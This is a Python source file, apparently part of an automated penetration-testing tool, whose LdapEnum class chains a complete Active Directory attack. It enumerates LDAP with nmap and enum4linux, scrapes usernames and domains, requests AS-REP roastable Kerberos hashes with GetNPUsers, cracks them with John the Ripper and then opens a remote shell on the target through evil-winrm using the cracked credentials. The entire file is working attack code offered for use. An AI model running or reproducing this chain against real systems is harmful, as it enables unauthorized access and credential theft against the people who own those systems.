#!/usr/bin/env python3

import os
from sty import fg
from lib import nmapParser
from utils import config_parser
import re
from subprocess import call, PIPE, Popen
import requests
from utils import helper_lists


class LdapEnum:
    """LdapEnum Will Enumerate all found Ldap open ports using nmap and enum4linux and ldapsearch."""

    def __init__(self, target):
        self.target = target
        self.processes = ""

    def ldapSearch(self):
        """This will run a helper bash script that will attempt to login to smb
        using smbmap if any valid SambaNTHashes are found using a
        passthe hash technique."""
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            ldap_enum = f"{os.getcwd()}/lib/ldap.sh {self.target}"
            call(ldap_enum, shell=True)

    def Scan(self):
        """If Ldap ports are open, run nmap ldap scripts, enum4linux and the results
        will be fed to the ldap.sh bash script."""
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            c = config_parser.CommandParser(f"{os.getcwd()}/config/config.yaml", self.target)
            if not os.path.exists(c.getPath("ldap", "ldapDir")):
                os.makedirs(c.getPath("ldap", "ldapDir"))
            print(fg.cyan + "Enumerating LDAP: Lightweight Directory Access Protocol, Running the following commands:" + fg.rs)
            string_ldap_ports = ",".join(map(str, ldap_ports))
            commands = []
            commands.append(c.getCmd("ldap", "nmapLdap", ldapPorts=string_ldap_ports))
            commands.append(c.getCmd("ldap", "enum4linuxLdap"))
            self.processes = tuple(commands)

    def PwnWinRM(self):
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            c = config_parser.CommandParser(f"{os.getcwd()}/config/config.yaml", self.target)

            def parse_users():
                user_list = []
                ignore_list = ["Administrators", 'DnsAdmins', 'DnsUpdateProxy', 'ExchangeLegacyInterop',
                               'Guests', 'IIS_IUSRS', 'Replicator', 'Users', 'SMB3_11', 'DefaultAccount', 'Guest']
                if os.path.exists(c.getPath("ldap", "ldapEnum4linux")):
                    f = open(c.getPath("ldap", "ldapEnum4linux"), 'r')
                    users = [re.findall(r"\[([A-Za-z0-9_-]+)\]", u) for u in sorted(set(line.rstrip() for line in f))]
                    for u in users:
                        if u not in user_list:
                            for x in u:
                                if not x.startswith("0x") and (len(x) > 1) and (x not in ignore_list):
                                    user_list.append(x)
                    f.close()
                    if len(user_list) != 0:
                        if not os.path.exists(c.getPath("wordlists", "wordlistsDir")):
                            os.makedirs(c.getPath("wordlists", "wordlistsDir"))
                        print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
                        userlist_file = open(c.getPath("wordlists", "ldapUsernames"), "w+")
                        for i in user_list:
                            userlist_file.write(i + "\n")
                        userlist_file.close()
                        return user_list

            def parse_ldap_domain():
                if os.path.exists(c.getPath("ldap", "ldapEnum4linux")):
                    ig = helper_lists.ignoreDomains()
                    ignore_extensions = ig.ignore
                    lf = open(c.getPath("ldap", "ldapEnum4linux"), 'r')
                    domain = []
                    dns = [re.findall(r"(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{3,6}", d) for d in sorted(set(line.rstrip() for line in lf))]
                    for x in dns:
                        if x not in domain:
                            for dn in x:
                                if not any(s in dn for s in ignore_extensions):
                                    dn_lower = dn.lower()
                                    if dn_lower not in domain and (not dn_lower.startswith("ldap")) and (not dn_lower.endswith("portcu")):
                                        num_dots = int(dn_lower.count("."))
                                        if num_dots <= 1:
                                            domain.append(dn_lower)
                    lf.close()
                    # print(domain)
                    return domain

            def GetNPUsers():
                users = parse_users()
                domain = parse_ldap_domain()
                if len(domain) == 1 and (len(users) != 0):
                    dope_cmd = f"""{c.getCmd("ldap", "GetNPUsers", domain=str(domain[0]))}"""
                    print(f"[{fg.li_magenta}+{fg.rs}] {dope_cmd}")
                    call(dope_cmd, shell=True)

            def check_parse_hashes():
                GetNPUsers()
                if os.path.exists(c.getPath("ldap", "getNPUserNamesBrute")):
                    getnp_file = open(c.getPath("ldap", "getNPUserNamesBrute"), "r")
                    hashes = [h for h in sorted(set(line.rstrip() for line in getnp_file)) if h.startswith("$")]
                    getnp_file.close()
                    # print(hashes)
                    if not os.path.exists(c.getPath("loot", "lootDir")):
                        os.makedirs(c.getPath("loot", "lootDir"))
                    hash_file = open(c.getPath("loot", "krbHashes"), "w+")
                    if len(hashes) != 0:
                        for i in hashes:
                            hash_file.write(i.rstrip() + "\n")
                    hash_file.close()
                    return hashes

            def HeresJonny():
                krb_hashes = check_parse_hashes()
                if len(krb_hashes) != 0:
                    print(f"[{fg.li_magenta}+{fg.rs}] Found krb hash!")
                    print(f"[{fg.li_magenta}+{fg.rs}] BruteForcing The Hash!")
                    john_cmd = c.getCmd("john", "jcrack", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                    call(john_cmd, shell=True)

            def parseCreds():
                def cmdline(command):
                    process = Popen(args=command, stdout=PIPE, shell=True)
                    return process.communicate()[0]

                john_show_cmd = c.getCmd("john", "jshow", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                john_show_output = [i.strip() for i in cmdline(john_show_cmd).decode("utf-8").split("\n")]
                num_cracked = [int(p[0]) for p in sorted(set(i for i in john_show_output if "password hash cracked," in i))]
                if num_cracked is not None:
                    if num_cracked[0] >= 1:
                        passwords = []
                        usernames = []
                        for i in john_show_output:
                            if ":" in i:
                                passwords.append(i.split(":")[1])
                                usernames.append(i.split(":")[0].split("$")[3].split("@")[0])
                                # print(i.split(":")[1])
                        return zip(usernames, passwords)

            def checkWinRm():
                HeresJonny()
                r = requests.post(f"http://{self.target}:5985/wsman", data="")
                if r.status_code == 401:
                    user_pass = dict(parseCreds())
                    users = []
                    passwords = []
                    for k, v in user_pass.items():
                        users.append(k)
                        passwords.append(v)
                    if len(users) != 0 and (len(passwords) != 0):
                        try:
                            dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
                            print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
                            print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
                            print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
                            print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
                            print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
                            kwargs = {}
                            kwargs.update(start_new_session=True)
                            revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
                            assert not revshell.poll()

                        except IOError as e:
                            print(e)
                            exit()

            checkWinRm()
